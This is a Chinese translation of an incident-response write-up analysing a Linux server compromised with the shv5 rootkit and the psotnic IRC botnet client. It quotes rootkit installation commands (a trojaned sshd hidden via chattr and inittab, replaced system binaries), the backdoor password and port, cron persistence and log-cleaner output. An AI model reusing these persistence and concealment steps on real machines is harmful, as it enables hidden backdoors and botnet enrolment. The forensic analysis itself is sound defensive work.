<p>“setup”这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门–”/bin/ttyload”,然后把它加到了”/etc/inittab”,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>
<p>mv $SSHDIR/sshd /sbin/ttyload chmod a+xr /sbin/ttyload chmod o-w /sbin/ttyload touch -acmr /bin/ls /sbin/ttyload chattr +isa /sbin/ttyload kill -9 <code>pidof ttyload</code> &gt;/dev/null 2&gt;&amp;1 .... /# INITTAB SHUFFLING chattr -isa /etc/inittab cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1 cat /etc/inittab |grep getty &gt; /tmp/.init2 echo &quot;/# Loading standard ttys&quot; &gt;&gt; /tmp/.init1 echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p>
<p>它也替换了一些linux的标准命令.</p>
<p>/# Backdoor ps/top/du/ls/netstat/etc.. cd $BASEDIR/bin BACKUP=/usr/lib/libsh/.backup mkdir $BACKUP ... /# ls ... chattr -isa /bin/ls cp /bin/ls $BACKUP mv -f ls /bin/ls chattr +isa /bin/ls</p>
<p>这样子就可以解释为什么”ls”命令输出那么奇怪了.</p>
<p>“.backup”文件夹保存了被替换之前的命令程序.</p>
<p>root@server1:/var/.x/# ls -l /usr/lib/libsh/.backup/ total 552 -rwxr-xr-x 1 root root 126276 Dec 24 22:58 find -rwxr-xr-x 1 root root 59012 Dec 24 22:58 ifconfig -rwxr-xr-x 1 root root 77832 Dec 24 22:58 ls -rwxr-xr-x 1 root root 30388 Dec 24 22:58 md5sum -rwxr-xr-x 1 root root 99456 Dec 24 22:58 netstat -rwxr-xr-x 1 root root 65492 Dec 24 22:58 ps -rwxr-xr-x 1 root root 14016 Dec 24 22:58 pstree -rwxr-xr-x 1 root root 50180 Dec 24 22:58 top</p>
<p>看了一下时间戳,居然是在圣诞节.</p>
<p>很显然,原始的”ls”和后门安装的”ls”是不一样的.他们的md5对比如下:
root@server1:~/# md5sum /usr/lib/libsh/.backup/ls /bin/ls eef7ca9dd6be1cc53bac84012f8d1675 /usr/lib/libsh/.backup/ls 0a07cf554c1a74ad974416f60916b78d /bin/ls root@server1:~/# file /bin/ls /bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), for GNU/Linux 2.0.0, stripped root@server1:~/# file /usr/lib/libsh/.backup/ls /usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked (uses shared libs), for GNU/Linux 2.6.0, stripped</p>
<p>这个rootkit(“sh5.tar.gz”)是从下面的地址下载的.</p>
<p>root@server1:~/# dig +short -x 83.19.148.250 4lo.bydg.pl.</p>
<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>
<p>这是运行”setup”命令的截图:(在服务器上的沙盒里运行的)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030843_30626.jpg" alt=""></p>
<p>所以”zibi.joe.149″是后门的密码,”54098″是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030856_44197.jpg" alt=""></p>
<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.”psotnic0.2.5.tar.gz”就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为”smbd”,来达到隐藏的目的.</p>
<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.</p>
<p>371 vi conf 372 vi conf1 .... 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1</p>
<p>让我们执行一下382这条命令,看看会发生什么.
root@server1:/var/.x/psotnic/# ./smbd -a conf conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [+] Adding: /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 [+] Adding: /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1 [+] Added 2 psotnics to cron</p>
<p>哇!它添加了cron定时任务.赶紧看一看:</p>
<p>root@server1:/var/.x/psotnic/# crontab -l /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1</p>
<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:
root@server1:~/# cd /var/.x/psotnic; ./smbd conf Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/<em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5724] root@server1:/var/.x/psotnic/# ./smbd conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/</em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5727] root@server1:/var/.x/psotnic/#</p>
<p>用”ps”命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.</p>
<p>root@server1:/var/.x/psotnic/# ps axuw | grep smb root 3799 0.0 0.4 8592 2156 ? S 11:00 0:00 /usr/sbin/smbd -D root 3808 0.0 0.1 8592 896 ? S 11:00 0:00 /usr/sbin/smbd -D root 5724 0.0 0.1 1648 772 pts/2 S 12:47 0:00 ./smbd conf root 5727 0.0 0.1 1640 764 pts/2 S 12:47 0:00 ./smbd conf1</p>
<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用”strace”命令来看看它做了什么:
root@server1:~/# strace -p 5727 ... connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&quot;83.18.74.235&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress) ... connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&quot;195.159.0.92&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)</p>
<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:</p>
<p>root@server1:~/# dig +short -x 83.18.74.235 manhattan.na.pl. root@server1:~/# dig +short -x 195.159.0.92 ircnet.irc.powertech.no.</p>
<p>又是一个波兰的ip.另外一个ip,”ircnet.irc.powertech.no”是”irc.powertech.nof”的别名.是挪威一个著名的irc服务器.</p>
<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了”irc.powertech.no”,加入了”/#aik”频道.
:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no :irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1 :578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :/#aik :irc.powertech.no 353 578PAB9NB @ /#aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo :irc.powertech.no 366 578PAB9NB /#aik :End of NAMES list. :irc.powertech.no 352 578PAB9NB /#aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW :irc.powertech.no 352 578PAB9NB /#aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW :irc.powertech.no 352 578PAB9NB /#aik ~raider mobitech-70.max-bc.spb.ru /<em>.dotsrc.org raider G :4 raider - GTW :irc.powertech.no 352 578PAB9NB /#aik ~brandyz mobitech-70.max-bc.spb.ru /</em>.dotsrc.org brandyz G :4 brandyz - GTW :irc.powertech.no 352 578PAB9NB /#aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp jpi G :8 jpi - GTW :irc.powertech.no 352 578PAB9NB /#aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp /</em>.jp conf G :7 conf - GTW :irc.powertech.no 352 578PAB9NB /#aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp xerkoz H :7 xerkoz - GTW :irc.powertech.no 352 578PAB9NB /#aik lm campus19.panorama.sth.ac.at /</em>.at IpaL H :5 .LaPi.9@.IRCNet.. :irc.powertech.no 352 578PAB9NB /#aik ~vvo ppp86-7.intelcom.sm /*.tiscali.it vvo H :6 vvo - GTW :irc.powertech.no 315 578PAB9NB /#aik :End of WHO list. 这些仅仅是加入/#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了. 17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined /#aik 17:43 [Users /#aik] 17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo ] 17:43 [ brandyz ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 17:43 -!- Irssi: /#aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal] 17:43 -!- Irssi: Join to /#aik was synced in 1 secs</p>
<p>我发现我朋友的服务器使用的昵称是”578PQB9NB”,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀”\/*-GTW”,只有一个没有:</p>
<p>17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at] 17:45 [powertech] -!- ircname : LaPi@IRCNet 17:45 [powertech] -!- channels : /#relaks /#ping @/#seks /#aik @/#ogame.pl /#pingwinaria /#hattrick /#trade /#admin @/#!sh 17:45 [powertech] -!- server : /*.at [\o\ \o/ /o/]</p>
<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:</p>
<p>$ dig +short campus19.panorama.sth.ac.at 193.170.51.84</p>
<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:
From: Alexander Talos via RT To: larstra@ifi.uio.no Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84) [ACOnet CERT /#38603] Date: Fri, 18 May 2007 18:22:43 +0200 (CEST) Reply-To: cert@aco.net -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 Hej! On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote: &gt; I have been tracking down cracker which connected from &gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all behind a NAT gateway - it will be very hard to get hold of the miscreant. This incident will, in the long run, definitely help me getting rid of the NAT boxes in setups like that, but right now, we will have to make do with what we have. &gt; Please investigate the host in question. Perhaps is this a &gt; compromised host on your network acting as a jumpstation for Sure, and even in a NATed environment, this is still possible. Btw, you did a great job in analysing the compromised machine! I&#39;ll let you know when I have either further questions or any interesting results. Cheers, Alexander Talos - -- IT-Security, Universitaet Wien, ACOnet CERT T: +43-1-4277-14351 M: +43-664-60277-14351</p>
<p>看起来我不够幸运.</p>
<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.</p>
<p>连接到”83.18.74.235″的流量看起来很混乱.只好再次用strace命令:</p>
<p>root@server1:/var/.x/psotnic/# strace -f ./smbd conf1 &amp;&gt; /root/dump.strace</p>
<p>跟预期的一样,有很多输出,其中一个是它尝试启动”BitchX”,这是一个irc客户端.但是失败了,因为BitchX没有安装:</p>
<p>[pid 7537] write(2, &quot;sh: &quot;, 4) = 4 [pid 7537] write(2, &quot;BitchX: not found&quot;, 17) = 17 [pid 7537] write(2, &quot;n&quot;, 1) = 1 [pid 7537] close(2) = 0</p>
<p>下面的截图是tcpdump抓到流量的一部分:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130911/20130911000637_34187.jpg" alt=""></p>
<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是”irc.hitos.no”,位于挪威的特罗姆斯郡.</p>
<p>入侵者除了这些,还运行了一个叫”hide”的脚本来清除日志:
root@server1:/usr/lib/libsh/# ./hide + Linux Hider v2.0 by mave enhanced by me! [+] [Shkupi Logcleaner] Removing + from the logs........ . [+] /var/log/messages ... [done] [+] /var/run/utmp ... [done] [+] /var/log/lastlog ... [done] [+] /var/log/wtmp ... [done] /<em> m i s s i o n a c c o m p l i s h e d /</em> p.h.e.e.r S.H.c.r.e.w</p>
<p>那么这个入侵者为什么还要把”/var/log/”目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>
<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:</p>
<p>1, 忘记清除”.bash_history”文件</p>
<p>2, “/var/log”目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>
<p>3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>
<p>4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>
<p>5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>
<p>当然还有几个遗留的问题:</p>
<p>1,”ssh ftp@62.101.251.166″ 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>
<p>$ dig +short -x 62.101.251.166 cA6FB653E.dhcp.bluecom.no.</p>
<p>2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?</p>
<p>3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:</p>
<p>/<em>猜测root密码,不幸的是这个密码是强密码/</em></p>
<p>/<em>未知的exploit/</em></p>
<p>/<em>某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码./</em></p>
<p><a href="http://blog.larsstrand.no/2007/04/holiday-cracking.html" target="_blank">原文地址</a>
9 1 您已评价！</p>
<h6 id="-freebuf-com-http-www-freebuf-com-"><strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h6>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12696.html" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
</ul>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12443.html" target="_blank">一次服务器被入侵后的分析</a></li>
</ul>
<ul>
<li><p><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank">Socks代理反弹突破内网</a></p>
</li>
<li><p><a href="http://www.freebuf.com/articles/system/12140.html" target="_blank">如何导出Windows哈希系列二</a></p>
</li>
<li><p><a href="http://www.freebuf.com/articles/system/12104.html" target="_blank">浅谈企业运维安全</a>
﻿</p>
</li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 21:44:15"datetime="2014-03-29 21:44:15"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--一次服务器被入侵后的分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/92/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li class="active"><li><span class="page-number current">93</span></li><li><a class="page-number" href="/page/94/">94</a></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/163/">163</a></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="extend next" href="/page/94/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Site powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a>  update time: <em>2014-03-29 22:06:56</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
